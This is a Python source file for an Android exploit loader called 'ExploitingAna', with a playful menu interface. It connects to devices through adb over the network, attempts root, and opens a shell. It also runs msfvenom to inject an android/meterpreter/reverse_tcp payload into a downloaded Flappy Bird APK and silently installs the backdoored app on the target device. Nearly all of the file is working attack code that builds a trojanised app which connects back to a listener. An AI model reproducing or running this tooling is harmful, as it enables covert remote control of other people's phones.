import uiautomator, os, sys, time, colorama
from uiautomator import Device
from colorama import Fore, Back


#Initializing Colorama
colorama.init(autoreset=True)


# Creating a class for all the usable adb and payload creation commands
class exploit():
    def list_devices(self):
        os.system('adb devices -l')

    def root_access(self):
        os.system('adb root')

    def connect(self):
        ip = input('Select a Mobile IP from the list :')
        os.system(f'adb connect {ip}:5555')

    def disconnect_all(self):
        os.system('adb disconnect')

    def get_shell(self):
        os.system(f'adb shell')

    def venom(self):
        print('\n')
        print(Fore.YELLOW+ 'Attempting to download original apk.....  ')
        os.system('wget https://github.com/SanWatty/ExploitingAnaChan/blob/2bd7385f759a4b8246109d251e6e1286e785b4b4/flappy_bird-v1-3.apk')
        print('\n')
        print(Fore.YELLOW + 'Attempting to to inject payload.....  ')
        print(Fore.CYAN+'Creating backdoored apk....')
        os.system('msfvenom -x flappy_bird-v1-3.apk -p android/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=4444 R > flappy_bird_backdoored.apk')
#End of class


#Try to read the list of Android devices connected
def ana_detect() -> object:
    print('\n')
    print(Fore.RED+'Detecting all connected devices......')
    time.sleep(3)
    print('\n')
    exploit().list_devices()

#Try detecting Ana Version
def ana_version():
    exp = exploit()
    exp.connect()
    print('\n')
    print(Fore.YELLOW + 'Trying to get Android version......')
    time.sleep(3)
    os.system(f'adb shell getprop ro.build.version.release')

#Try Normal Exploit
def ana_sHell():
    exp = exploit()
    exp.connect()
    print('\n')
    time.sleep(5)
    print(Fore.YELLOW+'Attempting root....')
    time.sleep(3)
    exp.root_access()
    print('\n')
    print(Fore.YELLOW+'Trying to get shell access....')
    time.sleep(3)
    print(Fore.RED+'PLEASE DONT BREAK ME MR.HACKOOOR ;_;')
    print(Fore.RED+'You have shell access for the Device!')
    exp.get_shell()

#Try to implement exploit
def ana_exploit():
    exp = exploit()
    exp.connect()
    exp.venom()
    time.sleep(3)
    os.system('adb install -r flappy_bird_backdoored.apk')



#Beautify display
def banner():
    print(Fore.RED+ Back.GREEN+"""\
   ▄████████ ▀████    ▐████▀    ▄███████▄  ▄█        ▄██████▄   ▄█      ███      ▄█  ███▄▄▄▄      ▄██████▄  
  ███    ███   ███▌   ████▀    ███    ███ ███       ███    ███ ███  ▀█████████▄ ███  ███▀▀▀██▄   ███    ███ 
  ███    █▀     ███  ▐███      ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ ███▌ ███   ███   ███    █▀  
 ▄███▄▄▄        ▀███▄███▀      ███    ███ ███       ███    ███ ███▌     ███   ▀ ███▌ ███   ███  ▄███        
▀▀███▀▀▀        ████▀██▄     ▀█████████▀  ███       ███    ███ ███▌     ███     ███▌ ███   ███ ▀▀███ ████▄  
  ███    █▄    ▐███  ▀███      ███        ███       ███    ███ ███      ███     ███  ███   ███   ███    ███ 
  ███    ███  ▄███     ███▄    ███        ███▌    ▄ ███    ███ ███      ███     ███  ███   ███   ███    ███ 
  ██████████ ████       ███▄  ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀   █▀    ▀█   █▀    ████████▀  
                                          ▀                                                                 
        ▄████████ ███▄▄▄▄      ▄████████  ▄████████    ▄█    █▄       ▄████████ ███▄▄▄▄                     
       ███    ███ ███▀▀▀██▄   ███    ███ ███    ███   ███    ███     ███    ███ ███▀▀▀██▄                   
       ███    ███ ███   ███   ███    ███ ███    █▀    ███    ███     ███    ███ ███   ███                   
       ███    ███ ███   ███   ███    ███ ███         ▄███▄▄▄▄███▄▄   ███    ███ ███   ███                   
     ▀███████████ ███   ███ ▀███████████ ███        ▀▀███▀▀▀▀███▀  ▀███████████ ███   ███                   
       ███    ███ ███   ███   ███    ███ ███    █▄    ███    ███     ███    ███ ███   ███                   
       ███    ███ ███   ███   ███    ███ ███    ███   ███    ███     ███    ███ ███   ███                   
       ███    █▀   ▀█   █▀    ███    █▀  ████████▀    ███    █▀      ███    █▀   ▀█   █▀                    """)

    print(Fore.YELLOW+"+ -- --=[ExploitingAna v1.5]")
    print(Fore.YELLOW+"+ -- --=[Android exploit loader. This project revolves around a python program that can detect, load and exploit vulnerable versions of Android.]")
    print(Fore.YELLOW+"+ -- --=[https://github.com/SanWatty/ExploitingAnaChan]")
    print(Fore.YELLOW + "+ -- --=[https://github.com/aravindchennaram]")
    print(Fore.YELLOW + "+ -- --=[https://github.com/utkdrall]")
    print('\n')



#Display to create options
def clidisplay():
    print(Fore.CYAN+'Hello Adventurer, I will help you to exploit Ana-chan *evil laughter*:')
    print('1. Detect connected Android devices')
    print('2. Detect the version of Android devices')
    print('3. Get Shell Access')
    print('4. Try Exploit for the Android')
    print('5. Get me out of here!')


#switch to navigate between options
def switch():
    op = int(input('Enter your choice: '))
    if op >= 1 and op <= 5:
        if op == 1:
            ana_detect()
            clidisplay()
            switch()
            print('\n')
        elif op == 2:
            ana_version()
            clidisplay()
            switch()
            print('\n')
        elif op == 3:
            ana_sHell()
            clidisplay()
            switch()
            print('\n')
        elif op == 4:
            ana_exploit()
            clidisplay()
            switch()
            print('\n')
        elif op == 5:
            print(Fore.YELLOW+"Closing program... Hope you had fun exploiting AnaChan :3")
            exit()
    else:
        print(Fore.YELLOW+"Error value, try again. program restarting...")
        switch()

#main of the program starts here
if __name__ == '__main__':
    banner()
    clidisplay()
    switch()


